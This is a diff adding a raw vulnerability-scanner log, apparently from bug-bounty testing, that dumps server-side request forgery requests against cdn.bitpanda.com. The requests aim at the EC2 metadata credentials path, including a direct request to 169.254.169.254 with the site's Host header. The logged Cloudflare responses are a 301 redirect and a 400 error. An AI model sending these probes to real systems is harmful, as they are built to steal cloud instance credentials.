@@ -1,0 +1,58 @@
+[amazon-ec2-ssrf] Dumped HTTP request for http://cdn.bitpanda.com
+
+
+GET http://cdn.bitpanda.com/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance HTTP/1.1
+Host: cdn.bitpanda.com
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+
+
+[amazon-ec2-ssrf] Dumped HTTP response http://cdn.bitpanda.com
+
+HTTP/1.1 301 Moved Permanently
+Content-Length: 167
+CF-RAY: 96a67079ddee916d-IAD
+Cache-Control: max-age=3600
+Connection: keep-alive
+Content-Type: text/html
+Date: Tue, 05 Aug 2025 12:53:47 GMT
+Expires: Tue, 05 Aug 2025 13:53:47 GMT
+Location: https://cdn.bitpanda.com/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
+Server: cloudflare
+Set-Cookie: _cfuvid=yBEtkgf2shx2DFlVQ9ghHhoN1ePRYDRWaeqTwiZi8yQ-1754398427197-0.0.1.1-604800000; path=/; domain=.bitpanda.com; HttpOnly
+X-Content-Type-Options: nosniff
+
+<html>
+<head><title>301 Moved Permanently</title></head>
+<body>
+<center><h1>301 Moved Permanently</h1></center>
+<hr><center>cloudflare</center>
+</body>
+</html>
+
+[amazon-ec2-ssrf] Dumped HTTP request for http://cdn.bitpanda.com
+
+
+@tls-sni: cdn.bitpanda.com
+GET http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance HTTP/1.1
+Host: cdn.bitpanda.com
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+
+
+[amazon-ec2-ssrf] Dumped HTTP response http://cdn.bitpanda.com
+
+HTTP/1.1 400 Bad Request
+Content-Length: 155
+CF-RAY: -
+Connection: close
+Content-Type: text/html
+Date: Tue, 05 Aug 2025 12:53:47 GMT
+Server: cloudflare
+
+<html>
+<head><title>400 Bad Request</title></head>
+<body>
+<center><h1>400 Bad Request</h1></center>
+<hr><center>cloudflare</center>
+</body>
+</html>
+
